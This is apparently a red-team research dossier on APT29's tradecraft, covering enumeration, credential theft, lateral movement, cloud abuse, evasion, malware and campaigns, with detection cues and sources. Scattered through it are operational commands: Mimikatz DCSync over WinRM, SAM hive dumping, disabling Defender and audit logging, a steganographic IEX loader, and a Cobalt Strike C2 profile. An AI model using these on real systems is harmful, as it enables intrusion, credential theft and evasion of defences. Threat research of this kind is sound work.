# APT29 (Cozy Bear / Midnight Blizzard / NOBELIUM / The Dukes) -- Tradecraft Research

**Purpose**: Deep operational intelligence for red team automation playbook construction.
**Research Date**: 2026-03-26
**Attribution**: Russia's Foreign Intelligence Service (SVR). Active since at least 2008.
**Aliases**: APT29, UNC2452, IRON RITUAL, IRON HEMLOCK, NobleBaron, Dark Halo, Blue Kitsune, UNC3524, CozyDuke, SolarStorm, YTTRIUM

---

## 1. Post-Compromise Behavior

### Enumeration Discipline

APT29 is surgical. They do NOT spray commands. Their post-compromise enumeration follows a pattern of minimal footprint discovery using native tools.

**Observed enumeration sequence (from MITRE emulation plans and incident reports):**

```
# System profiling -- always first
systeminfo
whoami
whoami /all
ipconfig /all

# Process discovery -- looking for security tools
Get-Process
tasklist

# Domain enumeration -- PowerShell preferred over net commands
Get-ADUser -Filter *
Get-ADGroupMember -Identity "Domain Admins"
Get-NetDomainController          # PowerView
Get-AcceptedDomain               # Exchange enumeration

# Trust and federation discovery -- critical for cloud pivot
Get-AcceptedDomain               # via Exchange Management Shell
nltest /domain_trusts            # via AdFind
```

**AdFind usage** (T1482, T1018, T1069.002): APT29 relies heavily on AdFind for:
- Domain trust enumeration
- Federated domain discovery
- Remote system enumeration
- Domain group enumeration

**Key behavioral pattern**: They enumerate AV/EDR products early (T1518.001) using WMI queries and registry inspection before deciding on tooling. They have been observed running custom `detectav` functions that enumerate registered AV products and `software` discovery via registry keys.

**File and directory discovery**:
```powershell
Get-WebServicesVirtualDirectory    # Exchange config enumeration
```

**Network connectivity check**: Custom tool GoldFinder (S0597) performs HTTP GET requests to identify proxy infrastructure and verify internet connectivity before exfiltration.

### Collection Patterns

Rapid collection via PowerShell one-liner targeting high-value file types:
```powershell
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
```

**Email collection** (high priority target):
```powershell
New-MailboxExportRequest -Mailbox <target> -FilePath \\server\share\export.pst
Get-MailboxExportRequest
# Cleanup:
Remove-MailboxExportRequest    # erase evidence of export
```

They specifically target executives, IT staff, and security team mailboxes. In the Microsoft breach, they used Exchange Web Services (EWS) API with `EWS.AccessAsUser.All` Graph API role and `ApplicationImpersonation` Exchange Online role.

---

## 2. Credential Harvesting

### DCSync (T1003.006)

APT29 uses DCSync to replicate directory service data from domain controllers. Requires `Replicating Directory Changes` and `Replicating Directory Changes All` privileges.

**From emulation plan -- KRBTGT hash extraction via lateral WinRM session:**
```powershell
# Establish WinRM session to DC
Invoke-WinRMSession -Username "[domain_admin]" -Password "[password]" -IPAddress [DC_IP]

# Copy Mimikatz to DC
Copy-Item m.exe -Destination "C:\Windows\System32\" -ToSession $session_id

# Execute DCSync for krbtgt
Invoke-Command -Session $session_id -scriptblock {
    C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit
} | out-string

# Clean up session
Get-PSSession | Remove-PSSession
```

### Kerberoasting (T1558.003)

Used as a standard privilege escalation step. Any unprivileged domain user can request TGS tickets for accounts with SPNs, then crack them offline. APT29 uses this when they need to escalate from a low-privilege foothold without triggering LSASS alerts.

### Golden SAML (T1606.002) -- Signature Technique

This is APT29's crown jewel credential technique, used extensively in the SolarWinds campaign.

**Attack chain:**
1. Gain administrative access to AD FS server
2. Extract token-signing certificate and private key
3. Use custom tool CRIMSONBOX (.NET) to extract the token signing certificate from AD FS configuration
4. Forge SAML responses signed with the stolen certificate
5. Present forged tokens to any federated service (M365, AWS, etc.)

**Key properties:**
- Bypasses MFA completely -- the forged token IS the authenticated session
- Works from any location, any time
- Persistent until the signing certificate is rotated (which requires disconnecting all federated services)
- Appears as normal federated sign-in in identity provider logs
- Detection requires behavioral baselines, not signatures

**Detection gaps:**
- Forged tokens create service provider logins with NO corresponding AD FS events (Event IDs 1200, 1202) and NO Domain Controller event 4769 (Kerberos service ticket)
- Look for the ABSENCE of these events when federated logins occur

**Related tools**: Mimikatz, AADInternals, ADFSDump (detectable via Sysmon Event ID 18)

### MFA Cookie Bypass (T1606.001)

APT29 has bypassed MFA on OWA accounts by generating a cookie value from a previously stolen secret key. They also forged `duo-sid` cookies to bypass Duo MFA.

### AD FS Backdoors

**FoggyWeb (2021)**: Passive backdoor on AD FS servers. Sets up an HTTP listener waiting for GET requests to URLs mimicking AD FS folder structure. Extracts:
- AD FS service configuration database
- Token signing certificates
- Token decryption certificates

**MagicWeb (2022)**: Rogue DLL (`Microsoft.IdentityServer.Diagnostics.dll`) that modifies SAML user authentication certificates, allowing sign-in as any user with any claims including MFA bypass. APT29 modified `Microsoft.IdentityServer.Servicehost.exe.config` to load the malicious DLL into the AD FS process (T1556.007).

### Browser Credential Theft (T1555.003)

During SolarWinds, extracted saved passwords and cookies from Chrome by copying user profile directories.

### SAM/LSA Extraction (T1003.002, T1003.004)

Registry hive extraction:
```
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
```

### LSASS Access via WMI

From emulation plan: custom `wmidump` function uses WMI class to execute Mimikatz remotely, avoiding direct process injection into lsass.exe.

### gMSA Password Theft

Attempted access to Group Managed Service Account passwords -- indicating targeting of service accounts used for automated tasks.

---

## 3. Lateral Movement

### Method Selection Hierarchy

APT29 chooses lateral movement based on environment and stealth requirements:

| Method | When Used | Why |
|--------|-----------|-----|
| **WinRM** (T1021.006) | Primary method in Windows domains | Pre-installed, trusted by security tools, minimal forensic artifacts, enables PowerShell remoting |
| **RDP** (T1021.001) | From public-facing systems to internal | Used when interactive access needed; signed RDP files in 2024 campaign |
| **SMB** (T1021.002) | Tool transfer and admin share access | For file staging and Cobalt Strike SMB Beacon lateral |
| **SSH** (T1021.004) | Linux environments, persistent gov targeting | Port forwarding on public systems |
| **Cloud Services** (T1021.007) | Azure/M365 environments | Synced on-premises accounts to Azure AD |
| **VPN/Citrix** (T1133) | Initial and sustained access | Compromised identities via VPN and Citrix |

### WinRM Lateral Movement (Primary)

```powershell
# Establish remote session
$session = New-PSSession -ComputerName <target> -Credential $cred

# Execute commands remotely
Invoke-Command -Session $session -ScriptBlock { Get-Process }

# Transfer tools
Copy-Item malware.exe -Destination "C:\Windows\System32\" -ToSession $session

# Execute remotely
Invoke-Command -Session $session -ScriptBlock {
    C:\Windows\System32\malware.exe <args>
}

# Clean up
Get-PSSession | Remove-PSSession
```

### Cobalt Strike SMB Beacon

For internal lateral movement, APT29 uses SMB Beacon with custom named pipes:
- `ntsvcs_##` (pipe name)
- `scerpc_##` (stager pipe name)

Post-exploitation pipes: `DserNamePipe##`, `PGMessagePipe##`, `MsFteWds##`

### Proxy Infrastructure for Lateral Movement

- **Internal proxy** (T1090.001): SSH port forwarding on public-facing systems; Cobalt Strike SMB named pipes
- **External proxy** (T1090.002): Compromised residential endpoints as proxy infrastructure
- **Multi-hop proxy** (T1090.003): Tor hidden services forwarding to ports 3389 (RDP), 139 (NetBIOS), 445 (SMB)
- **Domain fronting** (T1090.004): Meek plugin for Tor to make C2 traffic appear as Google TLS connections

### Cloud Lateral Movement

From the Microsoft breach: APT29 moved from a compromised test tenant to production by:
1. Compromising a legacy OAuth app in test tenant
2. Instantiating it as a service principal in production corporate tenant
3. Using acquired tokens to authenticate across environments
4. Exploiting `RoleManagement.ReadWrite.Directory` to escalate to Global Administrator

---

## 4. Cloud/SaaS Tradecraft

### Microsoft Corporate Breach (2024) -- Full Chain

1. **Password spray** against legacy test tenant account (no MFA)
2. Compromised OAuth test application
3. Acquired access tokens using compromised credentials
4. Exploited `AppRoleAssignment.ReadWrite.All` and `Directory.ReadWrite.All` MS Graph permissions
5. Created new user account in corporate tenant
6. Assigned Global Administrator role
7. Established service principals for malicious OAuth applications
8. Granted `full_access_as_app` role for Exchange Online
9. Accessed corporate mailboxes of senior leadership, security team, legal

**Tenfold increase** in password spray attempts observed by February 2024.

### OAuth Abuse Patterns (T1098.001, T1098.003)

- Add credentials to existing OAuth Applications and Service Principals
- Create malicious OAuth applications with high-privilege Graph API permissions
- Grant `EWS.AccessAsUser.All` or `ApplicationImpersonation` roles
- OAuth applications maintain access even when initially compromised account is remediated

### Device Code Phishing (2025)

Abuses Microsoft's OAuth 2.0 device authorization grant flow:

1. Attacker generates device code via attacker-controlled application
2. Social engineering via Signal/Element impersonating officials (State Dept, Ukrainian MoD, EU Parliament)
3. Victim directed to `https://www.microsoft.com/devicelogin` or `https://login.microsoftonline.com/common/oauth2/deviceauth`
4. Victim enters code, granting attacker a valid access token
5. Codes valid only 15 minutes -- some variants use interstitial pages that auto-regenerate codes

**Detection**: Monitor for `"authenticationProtocol": "deviceCode"` and `"originalTransferMethod": "deviceCodeFlow"` in Entra ID sign-in logs.

**Post-compromise**: Added unauthorized auth apps, configured MFA with attacker-controlled credentials, used Python scripts (`python-requests/2.25.1` user-agent) for automated exfiltration.

### Azure AD Device Registration (T1098.005)

APT29 registers devices with victim's Entra ID to bypass Conditional Access policies that restrict access to compliant/hybrid-joined devices only. They enrolled their own devices in MFA.

### Purview Audit Disabling (T1562.008)

APT29 has disabled Purview Audit on targeted accounts to prevent logging of email access and other cloud activities. This eliminates the audit trail for their mailbox collection.

### Azure VM as Proxy Infrastructure

APT29 uses Azure VMs in subscriptions outside victim organizations for last-mile access. Traffic sourced from trusted Microsoft IP ranges reduces detection likelihood.

### Microsoft Teams Social Engineering

Sending Teams message requests impersonating security/support teams, convincing victims to enter MFA codes in their Authenticator app, then capturing the authentication token.

### MFA Fatigue (T1621)

Repeated MFA push requests to overwhelm the target into accepting.

---

## 5. Patience and Operational Tempo

### Dwell Time

- **SolarWinds**: Initial compromise August 2019, discovered December 2020. **~16 months** undetected.
- **DNC**: Maintained access for **nearly a year** before detection.
- **Microsoft**: Breach began November 2023, detected January 12, 2024. **~2 months**.
- **General pattern**: Months to years of undetected access is the norm, not the exception.

### Timing Discipline

**POSHSPY WMI backdoor timing**: Configured WMI filter named `BfeOnServiceStartTypeChange` to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 AM local time. Note: deliberately excludes Wednesday and Sunday -- reducing execution frequency while maintaining regular check-ins. This mimics business-hours activity patterns.

**Cobalt Strike beaconing**: Sleep time of 60,591 seconds (~16.8 hours) with 37% jitter. This is an extremely long beacon interval -- designed to blend into normal traffic patterns with irregular timing.

**SUNBURST dormancy**: After deployment, SUNBURST remained dormant for up to two weeks before retrieving and executing commands. The backdoor checked blocklists for processes, services, and drivers associated with forensic and AV tools before activating.

### Operational Tempo Variations

Despite patience being their hallmark, APT29 demonstrated increased operational tempo in 2020-2021, running multiple large-scale compromises simultaneously across different time zones. Mandiant observed patterns suggesting different initial access operators or subteams supported by a centralized development team.

Post-SolarWinds, the pace increased again in H1 2023, with substantial tooling and tradecraft changes likely designed to support increased frequency while maintaining OPSEC.

### Subteam Structure

Evidence of organizational structure:
- Initial access operators (separate subteams per campaign)
- Centralized development team (shared tooling across operations)
- Post-compromise operators (specialized for persistence and collection)

---

## 6. Evasion Techniques

### EDR/AV Evasion

**Security tool disabling** (T1562.001):
```
sc stop WinDefend
sc config WinDefend start=disabled
```

**Audit log disabling** (T1562.002):
```
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
```

**Firewall modification** (T1562.004):
```
netsh advfirewall firewall add rule name="Allow" dir=out action=allow
```

### Process Injection (T1055, T1055.002)

- Portable Executable Injection for persistent infection
- Cobalt Strike injection using `NtMapViewOfSection` allocator
- Execution methods: `CreateThread`, `NtQueueApcThread`, `CreateRemoteThread`, `RtlCreateUserThread`
- Spawn-to processes: `%windir%\syswow64\dllhost.exe` (x86), `%windir%\sysnative\dllhost.exe` (x64)

### GRAPELOADER Memory Evasion (2025 -- State of the Art)

Novel shellcode execution technique:
1. Allocate shellcode memory with `PAGE_READWRITE`
2. Change protection to `PAGE_NOACCESS`
3. Create suspended thread pointing to inaccessible memory
4. Sleep 10 seconds (forces EDR/AV to scan memory they cannot read)
5. Change protection to `PAGE_EXECUTE_READWRITE`
6. Resume thread execution

This exploits the fact that security tools cannot scan memory marked as inaccessible.

### DLL Sideloading

**GRAPELOADER**: Sideloads via legitimate PowerPoint executable (`wine.exe`) loading `ppcore.dll` through delayed imports. Execution occurs through `PPMain` export, not `DllEntryPoint`, bypassing DLL injection detection.

**GraphicalProton (TeamCity campaign)**: Multiple sideloading pairs:
- `iisexpresstray.exe` + `mscoree.dll`
- `MpCmdRun.exe` + `MpCmdHelp.dll`
- `FlashUtil_ActiveX.exe` + `oleac.dll`
- `zabbix_agentd.exe` + `pdhui_1.dll`

### Timestomping (T1070.006)

```powershell
# From emulation plan
timestomp C:\Users\oscar\AppData\Roaming\Microsoft\kxwn.lock

# General technique
touch -t 202301011200.00 C:\Windows\System32\malicious.exe
```

Modified timestamps of backdoors to match legitimate Windows files. Used to make malware indistinguishable from long-standing system files.

### String Obfuscation (GRAPELOADER/WINELOADER)

Three distinct functions per encrypted string:
1. Retrieves encrypted bytes
2. Decrypts using custom algorithm
3. Immediately zeroes decrypted memory

Defeats automated tools like FLOSS -- decrypted strings never persist in memory.

### DLL Unhooking

Before calling any Windows API, GRAPELOADER unhooks the corresponding DLL and dynamically resolves APIs through in-memory PE parsing. This strips EDR hooks before making sensitive API calls.

### Code Obfuscation

Junk code insertion, code mutation, structural obfuscation. WINELOADER variant includes mutated junk code with time-consuming mathematical operations in large loops to frustrate analysis.

### Steganography (T1027.003)

Payload concealed in image files:
```powershell
# Extract payload from PNG steganography
sal a New-Object;Add-Type -AssemblyName 'System.Drawing';
$g=a System.Drawing.Bitmap('C:\Users\username\Downloads\monkey.png');
$o=a Byte[] 4480;
for($i=0; $i -le 6; $i++){
    foreach($x in(0..639)){
        $p=$g.GetPixel($x,$i);
        $o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))
    }
};
$g.Dispose();
IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))
```

### HTML Smuggling (T1027.006)

Embedded ISO files within HTML attachments containing JavaScript code that reconstructs the payload client-side, bypassing network-level inspection.

### Binary Padding (T1027.001)

Large files to evade security tools with file-size detection limits.

### UPX Packing (T1027.002)

Standard executable packing for signature evasion.

### Log Evasion

- **AUDITPOL**: Disable audit log collection
- **Purview Audit**: Disabled on targeted cloud accounts
- **Windows Event Log clearing** (T1070.001)
- **Mailbox export cleanup**: `Remove-MailboxExportRequest` to erase evidence
- **SDelete**: Secure file deletion with multiple overwrite passes

### Masquerading (T1036.004, T1036.005)

- Named scheduled tasks: `\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager`
- Named tasks as `DefenderUPDService`, `IISUpdateService`
- Renamed malicious DLLs with legitimate filenames
- Set C2 hostnames to match legitimate hostnames in victim environment
- Sourced VPN IPs from victim's country

---

## 7. Tool Discipline

### Custom Malware Arsenal

**SolarWinds era (2018-2021):**
| Tool | Purpose |
|------|---------|
| SUNBURST (S0559) | Supply chain backdoor in SolarWinds Orion |
| SUNSPOT (S0562) | Build process implant -- injected SUNBURST into builds |
| TEARDROP (S0560) | Memory-only dropper for Cobalt Strike BEACON |
| RAINDROP (S0565) | Follow-on Cobalt Strike loader |
| GoldMax (S0588) | Persistence malware with DGA |
| GoldFinder (S0597) | Network reconnaissance / proxy detection |
| Sibot (S0589) | Visual Basic malware |
| BoomBox | Early-stage reconnaissance |
| EnvyScout | Spearphishing HTML smuggling tool |
| TrailBlazer (S0682) | Additional post-compromise malware |
| CRIMSONBOX | .NET tool for AD FS token-signing cert extraction |
| MAMADOGS | Credential theft tool |
| FoggyWeb | AD FS passive backdoor |
| MagicWeb | AD FS authentication bypass DLL |

**2024-2025 era:**
| Tool | Purpose |
|------|---------|
| WINELOADER | Modular backdoor -- collects IP, username, process info |
| GRAPELOADER | Initial-stage loader -- fingerprinting, persistence, payload delivery |
| GraphicalProton | Post-exploitation malware (TeamCity campaign) |

**Legacy malware family (The Dukes):**
CozyCar, SeaDuke, FatDuke, MiniDuke, RegDuke, PolyglotDuke, CloudDuke, CosmicDuke, GeminiDuke, POSHSPY

### LOTL vs Custom Malware Decision Matrix

APT29 follows a clear pattern:

1. **Initial access**: Custom malware or supply chain implant (high investment, high stealth)
2. **Post-compromise enumeration**: LOTL exclusively (PowerShell, WMI, cmd.exe, native tools)
3. **Persistence**: Mix -- WMI subscriptions (LOTL) + custom backdoors as fallback
4. **Lateral movement**: LOTL (WinRM, RDP, SMB) + Cobalt Strike BEACON
5. **Credential access**: Mimikatz (known tool) + custom tools (CRIMSONBOX, MAMADOGS)
6. **Data staging/exfil**: LOTL (PowerShell compression, native archive tools)
7. **Fallback persistence**: Custom malware (POSHSPY, GoldMax) deployed only when primary access might be lost

### Cobalt Strike Configuration (APT29 Profile)

Based on documented Malleable C2 profile mimicking APT29 infrastructure:

```
# Timing
set sleeptime "60591";    # ~16.8 hours
set jitter "37";

# User Agent
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

# HTTP-GET
set uri "/jquery-3.3.1.min.woff2";
header "Host" "dataplane.theyardservice.com";

# HTTP-POST
set uri "/jquery-3.3.2.min.woff2";
header "Host" "cdn.theyardservice.com";

# SMB Beacon
set pipename "ntsvcs_##";
set pipename_stager "scerpc_##";

# Process Injection
set allocator "NtMapViewOfSection";
set min_alloc "16700";

# Post-Ex
set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
set keylogger "SetWindowsHookEx";
set amsi_disable "true";

# Stage
set sleep_mask "true";
set obfuscate "true";
set cleanup "true";

# SSH Banner
set ssh_banner "Ubuntu 18.04.4 LTS";
```

### Artifact Avoidance

- **SDelete**: Used with `/accepteula` flag for secure file deletion of initial access artifacts, dropped tools, and staging files
- **Tool rotation**: Temporarily replace legitimate utilities, execute payload, restore originals
- **Remove-MailboxExportRequest**: Clean up evidence of email export operations
- **Session cleanup**: `Get-PSSession | Remove-PSSession` after lateral WinRM use
- **Memory-only execution**: TEARDROP was memory-only; POSHSPY stored code in WMI properties (never touches disk)
- **Single-use infrastructure**: Some infrastructure components used only once

### POSHSPY -- The Ultimate LOTL Backdoor

Entirely fileless WMI + PowerShell backdoor:
- Code stored as encrypted, base64-encoded string in a custom WMI class property
- WMI event subscription reads, decrypts, and executes code from WMI property
- No artifacts on disk outside WMI repository
- DGA-based C2 using lists of legitimate domains local to the victim
- Infrequent beaconing with extensive traffic obfuscation and encryption
- Deployed as secondary/fallback backdoor -- activated only if primary access lost
- WMI filter `BfeOnServiceStartTypeChange` -- executes on specific weekdays at specific times

---

## 8. Recent Campaigns (2023-2025)

### TeamCity CVE-2023-42793 Exploitation (Late 2023)

- **Vulnerability**: Critical auth bypass (CVSS 9.8) in JetBrains TeamCity < 2023.05.4
- **Exploitation**: Custom Python exploit script for unauthenticated RCE
- **Post-exploitation**:
  ```
  cmd.exe "/c systeminfo"
  whoami
  whoami /all
  ipconfig /all
  ```
- **Malware**: GraphicalProton deployed via DLL sideloading
- **Persistence**: Scheduled tasks mimicking Windows services:
  ```
  schtasks.exe /create /SC ONLOGON /tn "\\Microsoft\\Windows\\DefenderUPDService"
  /tr "C:\\Windows\\system32\\rundll32.exe AclNumsInvertHost.dll,AclNumsInvertHost"
  ```
- **Credential harvesting**: LSASS access attempts, registry dumps
- **Infrastructure separation**: Different IPs for scanning vs. payload delivery
- **C2**: Open directory server at 103.76.128.34:8080 with SSL cert `*.ultasrv.com`

### Microsoft Corporate Breach (November 2023 - January 2024)

- Password spray against legacy test tenant (no MFA)
- OAuth app compromise -> service principal manipulation
- Test-to-production pivot via `AppRoleAssignment.ReadWrite.All`
- Global Administrator role assignment
- `full_access_as_app` for Exchange Online
- Accessed senior leadership, security team, legal mailboxes
- Tenfold increase in spray attempts by February 2024

### HPE Breach (2024)

- Compromised HPE's Microsoft Office 365 email environment
- Stole data from cybersecurity team and other departments
- Similar techniques to Microsoft corporate breach

### Signed RDP File Campaign (October 2024)

- **Scale**: Thousands of targets across 100+ organizations
- **Targets**: Government, academia, defense, NGOs
- **Technique**: Spear-phishing emails with attached `.rdp` files signed with Let's Encrypt certificates
- **Impact**: RDP files configured to map local drives, clipboard, video, audio to attacker-controlled server
- **Impersonation**: Microsoft and AWS employees; Zero Trust security concepts as lures
- **Resource access**: Full access to victim's local filesystem, clipboard, peripherals

### WINELOADER/GRAPELOADER Campaign (January 2025+)

- **Targets**: European Ministries of Foreign Affairs, embassies
- **Lure**: Wine-tasting event invitations from impersonated European MFA
- **Delivery**: `wine.zip` containing `wine.exe` (legit PowerPoint) + `ppcore.dll` (GRAPELOADER)
- **Persistence**: `C:\Users\User\AppData\Local\POWERPNT\` + Registry Run key `POWERPNT`
- **GRAPELOADER C2**: HTTPS POST to `https://ophibre[.]com/blog.php` every 60 seconds
- **WINELOADER C2**: RC4-encrypted HTTPS GET to `https://bravecup[.]com/view.php`
- **Anomalous IOC**: WINELOADER User-Agent claims Windows 7 with Edge v119 (impossible combination)

### Device Code Phishing Campaign (January-February 2025)

- **Targets**: Government officials, diplomats, researchers
- **Social engineering**: Via Signal/Element impersonating State Dept, Ukrainian MoD, EU Parliament
- **Technique**: OAuth 2.0 device code flow abuse
- **URLs**: `microsoft.com/devicelogin`, `login.microsoftonline.com/common/oauth2/deviceauth`
- **Time constraint**: 15-minute code validity; some variants use auto-regenerating interstitial pages
- **Post-compromise**: Unauthorized app registration, attacker-controlled MFA enrollment
- **Automated exfil**: Python scripts with `python-requests/2.25.1` user-agent
- **Attribution**: Medium confidence to CozyLarch/APT29 (Volexity)

---

## 9. Infrastructure OPSEC

### Residential Proxy Usage

APT29 routes traffic through compromised residential IP addresses (AT&T, Verizon wireless networks observed) to:
- Avoid geographic anomaly detection
- Appear as normal remote users
- Match expected IP ranges for victim organizations

### Azure VM Proxying

Azure VMs in subscriptions outside victim organizations provide last-mile access from trusted Microsoft IP ranges.

### Domain Fronting

TOR with meek domain fronting plugin creates encrypted tunnel that appears as Google TLS connections. Used since 2017, allows C2 traffic to look like legitimate Google services.

### C2 Infrastructure Discipline

- Set C2 hostnames to match legitimate hostnames in victim environment
- Source VPN IP addresses from victim's country
- Acquire domains via resellers (not direct registration)
- Use compromised domains for C2
- Dynamic DNS with randomly-generated subdomains
- DGA using legitimate domains geographically local to victim (550+ unique C2 URLs from 11 legitimate domains)
- Single-use infrastructure components
- Compromised residential endpoints as proxy chain

### Infrastructure Separation

Consistently separates scanning/exploitation infrastructure from C2/exfiltration infrastructure.

---

## 10. Exploited Vulnerabilities

| CVE | Product | Use |
|-----|---------|-----|
| CVE-2023-42793 | JetBrains TeamCity | Initial access, RCE |
| CVE-2020-0688 | Microsoft Exchange | Initial access |
| CVE-2019-19781 | Citrix ADC/Gateway | Initial access |
| CVE-2019-11510 | Pulse Secure VPN | Initial access |
| CVE-2018-13379 | FortiGate VPN | Initial access |
| CVE-2019-9670 | Zimbra | Initial access |
| CVE-2021-36934 | Windows (HiveNightmare) | Privilege escalation |

---

## 11. MITRE ATT&CK Technique Summary

### Initial Access
T1566.001, T1566.002, T1566.003, T1190, T1195.002, T1199, T1078.004

### Execution
T1059.001 (PowerShell), T1059.003 (cmd), T1059.005 (VBS), T1059.006 (Python), T1059.009 (Cloud API), T1047 (WMI), T1203, T1651

### Persistence
T1547.001, T1037.004, T1053.005, T1546.003, T1546.008, T1098.001, T1098.002, T1098.003, T1098.005, T1556.007, T1136.003

### Privilege Escalation
T1548.002, T1068, T1055, T1055.002

### Defense Evasion
T1027.001-.003/.006, T1036.004-.005, T1070.001/.004/.006/.008, T1562.001-.002/.004/.008, T1553.002, T1480.001

### Credential Access
T1003.002/.004/.006, T1110.001/.003, T1555.003, T1558.003, T1606.001/.002, T1528, T1539, T1621

### Discovery
T1087.002/.004, T1482, T1018, T1069.002, T1057, T1083, T1016.001, T1518.001

### Lateral Movement
T1021.001/.002/.004/.006/.007, T1080

### Collection
T1114.002, T1074.002, T1560.001

### Command and Control
T1071.001, T1090.001-.004, T1102.002, T1568, T1573, T1665

### Exfiltration
T1048.002

---

## Sources

- [MITRE ATT&CK G0016](https://attack.mitre.org/groups/G0016/)
- [MITRE ATT&CK SolarWinds Campaign C0024](https://attack.mitre.org/campaigns/C0024/)
- [Microsoft - Midnight Blizzard Guidance](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)
- [Microsoft - Midnight Blizzard RDP Campaign](https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/)
- [Mitiga - Microsoft Breach Analysis](https://www.mitiga.io/blog/microsoft-breach-by-midnight-blizzard-apt29-what-happened-and-what-now)
- [Check Point - APT29 GRAPELOADER/WINELOADER](https://research.checkpoint.com/2025/apt29-phishing-campaign/)
- [Volexity - Device Code Phishing](https://www.volexity.com/blog/2025/02/13/multiple-russian-threat-actors-targeting-microsoft-device-code-authentication/)
- [FortiGuard - TeamCity CVE-2023-42793](https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793)
- [Mandiant/Google - UNC2452 Merged into APT29](https://cloud.google.com/blog/topics/threat-intelligence/unc2452-merged-into-apt29)
- [Mandiant/Google - APT29 Evolving Diplomatic Phishing](https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing)
- [Mandiant/Google - POSHSPY Analysis](https://cloud.google.com/blog/topics/threat-intelligence/dissecting-one-ofap/)
- [Mandiant/Google - APT29 Domain Fronting](https://cloud.google.com/blog/topics/threat-intelligence/apt29-domain-frontin/)
- [Mandiant/Google - APT29 WINELOADER](https://cloud.google.com/blog/topics/threat-intelligence/apt29-wineloader-german-political-parties)
- [Mandiant/Google - APT29 Targeting M365](https://cloud.google.com/blog/topics/threat-intelligence/apt29-continues-targeting-microsoft/)
- [Sygnia - Golden SAML Detection](https://www.sygnia.co/threat-reports-and-advisories/golden-saml-attack/)
- [CISA AA24-057A - SVR Cloud Access](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-057a)
- [Picus Security - APT29 Evolution](https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques)
- [Blackpoint Cyber - APT29 Threat Profile](https://blackpointcyber.com/wp-content/uploads/2024/06/Threat-Profile-APT29_Blackpoint-Adversary-Pursuit-Group-APG_2024.pdf)
- [MITRE ATT&CK Evaluations - APT29](https://evals.mitre.org/enterprise/apt29/)
- [MITRE Adversary Emulation Library - APT29](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/apt29/)
- [BC-SECURITY - APT29 Malleable C2 Profile](https://github.com/BC-SECURITY/Malleable-C2-Profiles/blob/master/APT/dukes_apt29.profile)
- [Wiz - What is APT29](https://www.wiz.io/academy/threat-intel/what-is-apt29)
- [TerraZone - APT29 Deep Dive](https://terrazone.io/apt-29/)
- [Splunk - Golden SAML Journey](https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html)
